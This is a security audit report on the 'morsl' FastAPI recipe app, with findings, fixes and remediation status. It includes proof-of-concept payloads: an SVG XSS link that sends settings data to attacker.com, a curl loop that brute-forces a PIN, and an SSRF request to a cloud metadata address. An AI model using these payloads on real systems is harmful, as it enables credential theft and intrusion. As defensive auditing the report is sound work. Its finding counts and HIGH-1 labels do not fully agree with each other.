# Security Audit Report — morsl — 2026-04-05

## Summary

| | Critical | High | Medium | Low |
|--|----------|------|--------|-----|
| **Found** | 1 | 6 | 7 | 4 |

- **Language/Framework**: Python 3.12 / FastAPI, JavaScript (vanilla + Alpine.js)
- **Files Audited**: 55 / ~75 total
- **Scope**: broad
- **Focus**: all vulnerability classes

---

## Critical Findings

### [CRIT-1] SVG Sanitizer Bypass via `<a href="javascript:">` — `icons.js:585`

**Category**: Stored XSS via SVG injection
**CVSS estimate**: 8.6

**Description**: The client-side SVG sanitizer (`sanitizeSVG()` in `icons.js`) allows `<a>` in its element allowlist and `href`/`xlink:href` in its attribute allowlist. The value-level check strips `javascript:` and `data:` prefixes from attribute values, but `<a href="javascript:...">` wrapping a visible SVG node (e.g., `<rect>`) renders as a clickable link that executes JavaScript on click.

**Data flow**:
```
POST /api/custom-icons (admin or unauthenticated if PIN disabled)
  → server-side sanitize (defusedxml + py-svg-hush)
  → client-side sanitizeSVG() — allows <a> + href
  → x-html directive renders inline SVG in DOM
  → user clicks visible element → JavaScript executes
```

**Proof of concept**:
```xml
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
  <a href="javascript:fetch('/api/settings').then(r=>r.json()).then(d=>fetch('https://attacker.com/?t='+btoa(JSON.stringify(d))))">
    <rect width="32" height="32" fill="red"/>
  </a>
</svg>
```

**Impact**: Any user viewing the menu page clicks a recipe icon and executes attacker JavaScript — stealing admin token from sessionStorage, exfiltrating Tandoor API credentials, or performing admin actions. When PIN is disabled (the default), the upload itself requires no authentication.

**Fix**: Remove `<a>` from `_SVG_ALLOWED_ELEMENTS`. Alternatively, strip `href`/`xlink:href` from all elements except `<use>` and `<image>`, and validate those against an `http(s):` scheme allowlist. Consider replacing the hand-rolled sanitizer with DOMPurify configured for SVG.

---

## High Findings

### [HIGH-1] SSRF via `/api/settings/test-connection` — `settings.py:172`

**Category**: Server-Side Request Forgery
**CVSS estimate**: 7.2

**Description**: The test-connection endpoint accepts a user-supplied `url` (Pydantic `HttpUrl`) and makes a GET request to `{url}/api/food/?limit=1` with the Tandoor token in the Authorization header. No hostname validation against internal networks. During first-run (before credentials are configured), this endpoint is accessible without authentication via the `require_admin_or_first_run` guard.

**Data flow**:
```
POST /api/settings/test-connection {url: "http://169.254.169.254"}
  → httpx.AsyncClient.get(f"{url}/api/food/?limit=1", headers={"Authorization": f"Bearer {token}"})
  → response status reflected to caller
```

**Impact**: Internal network reconnaissance, cloud metadata exfiltration (IMDSv1), credential forwarding to attacker-controlled server. The Tandoor API token is sent in the Authorization header to whatever URL the caller specifies.

**Fix**: Resolve the hostname before making the request and reject RFC-1918, link-local (169.254.x.x), and loopback addresses. Set `follow_redirects=False`. Require admin auth regardless of first-run state for this endpoint.

---

### [HIGH-2] No Rate Limiting on PIN Verification — `settings.py:129`

**Category**: Brute Force
**CVSS estimate**: 7.1

**Description**: `/api/settings/verify-pin` has no rate limiting, lockout, or attempt counter. PINs are typically 4–6 digits (10,000–1,000,000 values). `hmac.compare_digest` prevents timing attacks but provides zero protection against volume attacks.

**Proof of concept**:
```bash
for pin in $(seq -w 0000 9999); do
  curl -s -X POST http://morsl:8000/api/settings/verify-pin \
    -H "Content-Type: application/json" -d "{\"pin\":\"$pin\"}" | grep -q valid && echo "PIN: $pin" && break
done
```

**Impact**: 4-digit PIN brute-forced in seconds. Yields admin session token.

**Fix**: Add exponential backoff after failed attempts (e.g., `slowapi` rate limiter). Lock out after N failures for M minutes.

---

### [HIGH-3] PIN Stored as Plaintext — `settings_service.py:79`

**Category**: Weak Credential Storage
**CVSS estimate**: 6.5

**Description**: The admin PIN is stored as plaintext in `data/settings.json`. Anyone with read access to the Docker volume (volume mount, backup, container escape) recovers the PIN immediately. The `hmac.compare_digest` comparison is correct for timing safety but irrelevant against file-read attacks.

**Fix**: Store a bcrypt/argon2 hash. Compare with constant-time hash verification.

---

### [HIGH-4] Tandoor Token Stored as Base64 (Not Encrypted) — `settings.py:198`

**Category**: Credential Exposure
**CVSS estimate**: 6.5

**Description**: `tandoor_token_b64` in `settings.json` is base64-encoded, not encrypted. Additionally, `POST /api/settings/test-connection` forwards the token to whatever URL the caller specifies (see HIGH-1). The setup wizard sends the raw token over HTTP (morsl has no built-in TLS).

**Fix**: Prefer env var for token (`TANDOOR_TOKEN`). Document that volume access grants Tandoor access. Never return the token in any API response.

---

### [HIGH-5] Dependabot Auto-Merge Without Human Review — `dependabot-automerge.yml`

**Category**: Supply Chain
**CVSS estimate**: 6.2

**Description**: The auto-merge workflow fires on `pull_request` events and merges Dependabot PRs automatically. Combined with `push.yml` → `release.yml` pipeline, a malicious patch-level release of any of morsl's 14 unpinned runtime dependencies gets auto-merged and auto-released to GHCR without human review.

**Impact**: Full supply chain compromise. A compromised `httpx`, `fastapi`, or any dependency patch version gets auto-deployed to all `:latest` users.

**Fix**: Require at least one human approval via branch protection rules. Pin dependencies to exact versions. Use Dependabot only for security advisories.

---

### [HIGH-6] Unsanitized SVG in Branding Upload Path — `settings.py:205`

**Category**: Stored XSS
**CVSS estimate**: 5.8

**Description**: The branding upload endpoint (`POST /api/settings/upload/logo`, etc.) validates file extension only — not content. SVG files are written to `data/branding/` without the `defusedxml`/`py-svg-hush` sanitization that `custom_icon_service.py` applies. A malicious SVG with `<script>` tags is served as `image/svg+xml`.

**Fix**: Apply the same SVG sanitization pipeline from `custom_icon_service.py` to branding SVG uploads.

---

## Medium Findings

### [MED-1] WiFi Password Persisted in Plaintext Settings — `admin.js:2327`

**Category**: Credential Exposure

The QR WiFi feature stores the WiFi PSK in `settings.json` via `saveSettings()`. When PIN is disabled, `GET /api/settings/public` exposes `qr_wifi_string` (which contains the full WPA2 PSK) to any unauthenticated caller.

**Fix**: Generate QR client-side without transmitting the password to the server. Remove `qr_wifi_string` from `PUBLIC_KEYS`.

---

### [MED-2] Tandoor Error Responses Reflected Verbatim — `proxy.py:47`

**Category**: Information Disclosure

All proxy routes pass the full Tandoor error `response.text` as `HTTPException(detail=...)`. Can expose stack traces, internal hostnames, database schema, or Django debug information.

**Fix**: Log full error server-side, return generic message to client.

---

### [MED-3] Unauthenticated Recipe Proxy — `proxy.py:54`

**Category**: Missing Authentication

`GET /api/proxy/recipe/{id}` requires no auth (no `require_admin` dependency), unlike other proxy endpoints. Any network client can enumerate all Tandoor recipes by iterating IDs.

**Fix**: Add `require_admin` dependency, or document as intentional for kiosk display.

---

### [MED-4] Unauthenticated Order Placement with Unvalidated Input — `orders.py:21`

**Category**: Input Validation / Stored Data Injection

`POST /api/orders` requires no authentication. `customer_name` has no max length, no character allowlist. Values flow into Tandoor's meal plan `note` field and are broadcast via SSE.

**Fix**: Add `max_length` to `customer_name` and `recipe_name` in `OrderRequest`. Require kiosk PIN if enabled.

---

### [MED-5] DOM XSS via QR Code innerHTML — `app.js:317`, `admin.js:2293`

**Category**: DOM XSS

`qrcode.createSvgTag()` output is injected via `innerHTML` from admin-configurable settings strings. If the QR library doesn't escape embedded data, crafted settings values could inject HTML/SVG.

**Fix**: Use `createElement`/`appendChild` instead of `innerHTML`.

---

### [MED-6] No CSRF Protection When PIN Disabled — `main.py`

**Category**: CSRF

No CSRF tokens or CORS middleware configured. When PIN is disabled, cross-origin `fetch()` with `Content-Type: application/json` can trigger state-changing operations (factory reset, menu wipe). The server processes the mutation even though the browser blocks the response.

**Fix**: Add `CORSMiddleware` with explicit `allow_origins`. Validate `Origin` header on state-changing requests.

---

### [MED-7] Internal Exception Messages Leaked to Clients — `profiles.py:156`, `templates.py:43`

**Category**: Information Disclosure

Several endpoints pass `str(e)` as `HTTPException(detail=...)` for `OSError`, `ValueError`, `KeyError`. Can expose filesystem paths and internal config field names.

**Fix**: Log full exception, return generic error messages.

---

## Low Findings

### [LOW-1] PIN Grace Period Too Long — `constants.py:14`

`PIN_IMMEDIATE_GRACE_SECONDS = 120` (2 minutes) for "immediate" mode. Should be 10–15 seconds.

### [LOW-2] Admin Tokens Not Pruned by TTL — `dependencies.py:58`

Expired tokens stay in memory until the 128-slot cache fills. Cleanup should prune expired tokens at creation time.

### [LOW-3] Service Worker Cache Never Invalidated — `service-worker.js:58`

`CACHE_NAME = 'morsl-v1'` is hardcoded and never changes across releases. A poisoned cache persists indefinitely.

### [LOW-4] `get_food_substitutes` Unsanitized Path Segment — `tandoor_api.py:379`

`substitute` parameter concatenated directly into URL. Currently hardcoded to `"food"` at all call sites, so not exploitable today. Should be validated.

---

## Attack Surface Summary

- **Entry points**: FastAPI REST API (16 route modules), SSE streams, file uploads (SVG, images), static file serving
- **Auth boundaries**: `require_admin` dependency (PIN-based, optional). All admin APIs open when PIN disabled (default). No auth on menu, recipe proxy, orders, profiles, categories, icons, icon-mappings
- **Trust boundaries**: Tandoor API responses → rendered in browser. Admin settings → DOM via `x-html`/`innerHTML`. SVG uploads → inline DOM rendering. Docker volume → credential storage

## Recommendations (Priority Order)

1. **CRIT-1**: Fix SVG sanitizer — remove `<a>` from allowed elements or replace with DOMPurify
2. **HIGH-1**: Add SSRF protection to test-connection — reject internal IPs, disable redirects
3. **HIGH-2**: Rate-limit PIN verification endpoint
4. **HIGH-5**: Require human review on Dependabot auto-merge, pin dependencies
5. **HIGH-6**: Apply SVG sanitization to branding uploads
6. **MED-1**: Stop persisting WiFi password server-side
7. **HIGH-3/4**: Hash PIN, document token exposure, prefer env var

## Remediation Status

| Finding | Severity | Status | Commit |
|---------|----------|--------|--------|
| CRIT-1 SVG sanitizer bypass | Critical | **Fixed** | `11bc2ad` |
| HIGH-1 SSRF on favicon URL | High | **Fixed** | `11bc2ad` |
| HIGH-2 PIN rate limiting | High | **Fixed** | `11bc2ad` |
| HIGH-3 PIN hashing | High | **Fixed** | `e1d78ea` |
| HIGH-4 Token encryption | High | **Won't fix** — env var path preferred; in-memory dict on single-user kiosk |
| HIGH-5 Branch protection + CI gates | High | **Fixed** | `11bc2ad` |
| HIGH-6 Branding SVG sanitization | High | **Fixed** | `11bc2ad` |
| MED-1 WiFi PSK in public settings | Medium | **Fixed** | `11bc2ad` |
| MED-2 Error response scrubbing | Medium | **Fixed** | `11bc2ad` |
| MED-3 Recipe proxy auth | Medium | **Won't fix** — kiosk display requires unauthenticated recipe access |
| MED-4 Input validation | Medium | **Fixed** | `11bc2ad` |
| MED-5 QR innerHTML | Medium | **Won't fix** — QR lib encodes data as cell pattern, not injectable text |
| MED-6 CORS origin restriction | Medium | **Fixed** | `e1d78ea` |
| MED-7 Exception message scrubbing | Medium | **Fixed** | `11bc2ad` |
| LOW-1 Grace period reduction | Low | **Fixed** | `11bc2ad` |
| LOW-2 Token pruning | Low | **Fixed** | `11bc2ad` |
| LOW-4 Path segment validation | Low | **Fixed** | `11bc2ad` |

**14 of 17 findings fixed. 3 accepted risks documented.**

## Not Vulnerable (Verified)

- **Path traversal**: `safe_path()` with symlink resolution + regex name validation on all file-backed services. Sound implementation.
- **SQL injection**: No SQL anywhere — all persistence is JSON files with atomic writes (`tempfile.mkstemp` + `os.replace`).
- **Deserialization**: `json.load` only. No pickle, no unsafe YAML, no eval.
- **Command injection**: No `subprocess` calls in the codebase.
- **SSRF via proxy routes**: All proxy routes derive target URL from operator-configured `tandoor_url`, not from caller input. Only `test-connection` is vulnerable.
- **Custom icon SVG (server-side)**: `defusedxml` + `py-svg-hush` sanitization is correctly applied. The bypass is client-side only.
- **Timing attacks on PIN**: `hmac.compare_digest` correctly used.

## Files Not Audited

- `tests/` — test files (not deployed)
- `web/js/qrcode.min.js` — third-party minified library
- `web/` HTML templates — would need full DOM analysis for completeness
- Static assets (CSS, images)
